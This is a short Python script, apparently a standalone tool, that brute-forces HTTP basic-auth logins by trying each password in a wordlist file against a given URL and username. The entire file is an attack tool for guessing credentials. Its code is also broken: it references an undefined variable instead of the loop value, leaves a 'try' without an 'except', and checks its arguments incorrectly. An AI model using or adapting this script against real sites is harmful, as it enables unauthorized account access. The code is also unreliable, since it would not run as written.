#!/usr/bin/env python3

import sys
import requests

if len(sys.argv) < 3:
    print("Usage: python3 web_bruteforce.py <URL> <username> <passwords-file-location>  \n Example: python3 web_bruteforce.py http://madbaby.com administrator ./passwords.txt \n");
    sys.exit()

URL = sys.argv[1]
HTTP_USER = sys.argv[2]

print("Bruteforce in progress...")

session = requests.Session()
  
pwlist = open(sys.argv[3]).read().split("\n")
for pw in pwlist:
    try:
        response = session.post(URL, auth=(HTTP_USER, password))
        if response.status_code == 200:
            print("Success: password is " + str(pw))       
            sys.exit()

print("Password not found.")
